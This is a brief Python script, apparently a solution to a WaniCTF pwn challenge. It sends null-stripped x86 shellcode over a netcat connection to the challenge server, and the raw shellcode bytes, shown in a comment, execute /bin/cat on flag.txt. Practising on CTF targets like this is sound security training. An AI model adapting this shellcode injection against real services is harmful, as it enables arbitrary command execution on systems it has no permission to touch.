from netcat import Netcat
import time

# start a new Netcat() instance
nc = Netcat('netcat-pwn.wanictf.org', 9004)
with open("cat.o","rb") as f:
    code=f.read()
#code=b"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80"
print(code)
code=code.replace(b"\x00",b"")
print(code)
nc.write(code)
time.sleep(0.5)
print(nc.read().decode("utf-8")+"\n"+"- "*20)